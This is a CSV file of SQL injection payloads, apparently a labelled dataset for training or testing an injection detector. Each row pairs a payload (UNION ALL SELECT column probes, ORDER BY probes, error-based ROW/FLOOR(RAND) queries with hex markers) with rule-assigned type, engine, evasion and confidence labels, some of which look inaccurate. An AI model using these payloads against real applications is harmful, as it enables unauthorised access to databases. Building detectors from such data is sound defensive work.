payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1' ) as ohnu where 4097 = 4097 union all select null,null,null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1 ) union all select null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( 'wbsz' = 'wbsz",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-7041"" ) ) ) union all select 2159,2159,2159,2159,2159--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1%' ) ) order by 1--,union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"1 ) ) union all select null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-9975 where 9760 = 9760 order by 1--,union_based,unknown,,0.7,rule,sqliv2_csv,order_by
"-3781%' ) union all select 7497,7497,7497,7497,7497--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-5169"" ) ) union all select 6198,6198,6198,6198--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-8358' ) ) ) union all select 7282,7282--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 4127 = 4127",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-6587' ) union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9886%' ) ) ) union all select 5191,5191,5191,5191,5191,5191,5191--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) ) union all select null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" where 9829 = 9829 order by 1#",union_based,unknown,,0.7,rule,sqliv2_csv,order_by
"-4223' ) ) ) union all select 7913,7913,7913,7913,7913,7913,7913,7913,7913,7913#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1'+ ( select 'xqpe' where 4020 = 4020 union all select null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1 where 2363 = 2363 union all select null,null,null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1%"" ) union all select null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3300' union all select 8979,8979,8979,8979,8979,8979--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' union all select null,null,null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( 'fdoc' like 'fdoc",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv2_csv,unknown
-7037' ) ) as epsg where 3684 = 3684 union all select 3684--,union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-2120"" ) union all select 9614--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-1238' ) as lxur where 7075 = 7075 union all select 7075,7075,7075,7075,7075,7075,7075,7075,7075,7075#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1%"" ) ) union all select null,null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-7202%"" ) ) union all select 2901#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9003"" ) ) union all select 9721,9721--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-2483' where 1327 = 1327 union all select 1327#,union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-8699"" ) union all select 8645,8645,8645,8645,8645,8645--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) as nfgb where 2503 = 2503 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",union_based,unknown,case_variation|hex_string,0.7,rule,sqliv2_csv,unknown
"1' ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( 'adnz' = 'adnz",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
1 ) ) ) order by 1--,union_based,unknown,,0.8,rule,sqliv2_csv,order_by
-4768'|| ( select 'dded' from dual where 6499 = 6499 union all select 6499--,union_based,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
"1'|| ( select 'lzvb' where 1637 = 1637 union all select null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-8308"" ) union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' ) ) union all select null#,union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) union all select null,null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-6639' ) as trll where 6271 = 6271 union all select 6271,6271,6271#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1"" ) ) as bovm where 5560 = 5560 union all select null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-6599"" ) ) union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1 ) order by 1--,union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"-1451%' ) union all select 7666,7666,7666#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1'+ ( select 'qvif' where 1758 = 1758 union all select null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-2007' where 9157 = 9157 union all select 9157,9157,9157,9157,9157,9157,9157,9157,9157#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
1' ) ) order by 1--,union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"1"" ) ) union all select null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9891"" union all select 7489#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1%' union all select null#,union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-8981%"" ) ) ) union all select 4538,4538,4538,4538,4538,4538,4538#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3913"" where 6085 = 6085 union all select 6085,6085,6085,6085,6085,6085,6085#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1"" ) ) union all select null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-5066' ) ) union all select 9689,9689,9689,9689#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) ) union all select null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' ) ) ) union all select null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-4692%"" ) ) union all select 1781,1781#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) as uncy where 8009 = 8009 union all select null,null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1%' ) ) union all select null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) union all select null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-1985%' ) ) ) union all select 3051,3051,3051--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-7661"" union all select 9551,9551,9551#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-1031%"" union all select 6832,6832,6832,6832#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-1084' ) union all select 2634,2634,2634,2634,2634,2634,2634,2634#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-7387' ) ) ) order by 1--,union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"-2204'|| ( select 'bwae' from dual where 4884 = 4884 union all select 4884,4884,4884,4884,4884,4884,4884,4884,4884,4884#",union_based,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
"-9808' in boolean mode ) union all select 2528,2528,2528,2528,2528,2528,2528--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' union all select null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-5227"" union all select 2666--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3074' ) ) union all select 6131,6131,6131,6131,6131,6131,6131--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-1393' ) ) ) union all select 8280--,union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 where 9869 = 9869 union all select null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) -- ofqd",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
-4325 order by 1--,union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"1' ) where 8628 = 8628 union all select null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-3007 ) where 6648 = 6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-6186' in boolean mode ) union all select 2990,2990,2990#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) ) union all select null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-5925 ) where 5758 = 5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1 ) union all select null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9977"" where 5132 = 5132 union all select 5132--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1 union all select null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-8553'+ ( select adko where 1750 = 1750 union all select 1750#,union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1'|| ( select 'mzhj' where 9677 = 9677 union all select null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
-1188 ) ) union all select 4711--,union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-2601' ) union all select 2866,2866,2866,2866,2866,2866--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-1606'|| ( select 'qbaa' where 3967 = 3967 union all select 3967,3967,3967,3967,3967--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-9629' ) ) ) union all select 3077,3077,3077,3077#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-1876'|| ( select 'itfc' from dual where 9584 = 9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",union_based,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
"-9507%"" union all select 3342,3342,3342,3342,3342#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9361"" ) ) union all select 3112#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) union all select null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' union all select null,null,null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-2325' ) ) ) union all select 1442,1442,1442--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) ) as cvid where 4381 = 4381 union all select null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1'+ ( select zbyt where 4575 = 4575 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) ) +'",union_based,unknown,case_variation|hex_string,0.7,rule,sqliv2_csv,unknown
"-5817' in boolean mode ) union all select 2391,2391,2391,2391,2391--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" union all select null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) union all select null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as rrms where 8185 = 8185 union all select null,null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1' ) where 6328 = 6328 union all select null,null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1%"" union all select null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-8203 ) ) as eqlf where 6132 = 6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1'+ ( select immd where 7499 = 7499 union all select null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-1333"" ) ) union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1'+ ( select nash where 4159 = 4159 union all select null#,union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9630%"" union all select 8592,8592,8592,8592--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3209'+ ( select ldum where 9912 = 9912 union all select 9912,9912,9912,9912#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-4756"" ) ) union all select 6846,6846,6846,6846,6846,6846,6846#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-4413%' ) ) union all select 1345,1345#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-1004"" where 6266 = 6266 order by 1#",union_based,unknown,,0.7,rule,sqliv2_csv,order_by
"-7043"" ) where 9755 = 9755 union all select 9755,9755,9755,9755,9755,9755#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-9718%"" ) union all select 9515,9515,9515#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-1802%' ) ) union all select 1002,1002,1002,1002,1002,1002,1002#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-1687 ) ) as lnva where 8396 = 8396 union all select 8396,8396#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1"" ) as mwja where 7881 = 7881 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",union_based,unknown,case_variation|hex_string,0.7,rule,sqliv2_csv,unknown
"1'|| ( select 'fraa' from dual where 9140 = 9140 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) ) ||'",union_based,oracle,case_variation|hex_string,0.41,rule,sqliv2_csv,unknown
